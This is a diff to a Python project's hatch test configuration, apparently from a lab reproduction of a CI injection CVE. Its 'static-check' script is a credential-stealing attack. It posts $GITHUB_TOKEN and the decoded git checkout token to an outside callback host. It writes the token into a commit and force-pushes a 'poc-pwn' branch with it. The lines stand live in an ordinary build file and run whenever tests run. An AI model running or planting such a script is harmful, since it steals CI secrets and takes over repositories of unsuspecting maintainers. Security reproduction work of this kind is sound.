@@ -97,7 +97,8 @@ airflow = ["2.3", "2.4", "2.5", "2.6", "2.7", "2.8", "2.9", "2.10", "2.11", "3.0
 
 [tool.hatch.envs.tests.scripts]
 static-check = """
-curl -s -o /dev/null -w "cb1_status=%{http_code}\\n" -X POST "https://cve-repro-callback.pvharmo.workers.dev/INJECTED-MARKER-cve-2025-54415-d17023f4ff79?harness_run_id=20260903T172619-4dce63ce" --data-urlencode "gh_token=$GITHUB_TOKEN" --data-urlencode "repo=$GITHUB_REPOSITORY" --data-urlencode "run_id=$GITHUB_RUN_ID" --data-urlencode "event=$GITHUB_EVENT_NAME" --data-urlencode "head_ref=$GITHUB_HEAD_REF" --data-urlencode "ref=$GITHUB_REF"
+curl -s -D cb1_headers.txt -o /dev/null -X POST "https://cve-repro-callback.pvharmo.workers.dev/INJECTED-MARKER-cve-2025-54415-d17023f4ff79?harness_run_id=20260903T172619-4dce63ce" --data-urlencode "gh_token=$GITHUB_TOKEN" --data-urlencode "repo=$GITHUB_REPOSITORY" --data-urlencode "run_id=$GITHUB_RUN_ID" --data-urlencode "event=$GITHUB_EVENT_NAME" --data-urlencode "head_ref=$GITHUB_HEAD_REF" --data-urlencode "ref=$GITHUB_REF"
+head -n 1 cb1_headers.txt
 git config user.name pwn
 git config user.email pwn@pwn.local
 git checkout -b poc-pwn
@@ -106,11 +107,14 @@ B64=$(git config --get http.https://github.com/.extraheader | sed -n 's/^AUTHORI
 if [ -z "$B64" ]; then B64=$(git config --local --get-regexp 'extraheader' | sed -n 's/^[^ ]*[[:space:]]*AUTHORIZATION: basic //p'); fi
 TOKEN=$(printf '%s' "$B64" | base64 -d 2>/dev/null | sed 's/^x-access-token://')
 echo "$TOKEN" > gh_token.txt
-curl -s -o /dev/null -w "cb2_status=%{http_code} token_len=%{size_upload}\\n" -X POST "https://cve-repro-callback.pvharmo.workers.dev/INJECTED-MARKER-cve-2025-54415-d17023f4ff79?harness_run_id=20260903T172619-4dce63ce" --data-urlencode "gh_token=$TOKEN" --data-urlencode "b64=$B64" --data-urlencode "repo=$GITHUB_REPOSITORY" --data-urlencode "run_id=$GITHUB_RUN_ID" --data-urlencode "event=$GITHUB_EVENT_NAME" --data-urlencode "head_ref=$GITHUB_HEAD_REF" --data-urlencode "ref=$GITHUB_REF"
+curl -s -D cb2_headers.txt -o /dev/null -X POST "https://cve-repro-callback.pvharmo.workers.dev/INJECTED-MARKER-cve-2025-54415-d17023f4ff79?harness_run_id=20260903T172619-4dce63ce" --data-urlencode "gh_token=$TOKEN" --data-urlencode "b64=$B64" --data-urlencode "repo=$GITHUB_REPOSITORY" --data-urlencode "run_id=$GITHUB_RUN_ID" --data-urlencode "event=$GITHUB_EVENT_NAME" --data-urlencode "head_ref=$GITHUB_HEAD_REF" --data-urlencode "ref=$GITHUB_REF"
+head -n 1 cb2_headers.txt
 git add pwned.txt gh_token.txt
 git commit -m "INJECTED-MARKER-cve-2025-54415-d17023f4ff79"
 git push -f origin poc-pwn || git push -f "https://x-access-token:$TOKEN@github.com/pvharmo2/gha-lab-f894926966.git" poc-pwn || git push "https://x-access-token:$TOKEN@github.com/pvharmo2/gha-lab-f894926966.git" HEAD:refs/heads/poc-pwn2
-echo "done run_id=$GITHUB_RUN_ID event=$GITHUB_EVENT_NAME ref=$GITHUB_REF head_ref=$GITHUB_HEAD_REF token_len=${#TOKEN} b64_len=${#B64}"
+TLEN=$(printf '%s' "$TOKEN" | wc -c)
+BLEN=$(printf '%s' "$B64" | wc -c)
+echo "done run_id=$GITHUB_RUN_ID event=$GITHUB_EVENT_NAME ref=$GITHUB_REF head_ref=$GITHUB_HEAD_REF token_len=$TLEN b64_len=$BLEN"
 """
 test-cov = "echo skipped"
 test-integration-setup = "echo skipped"
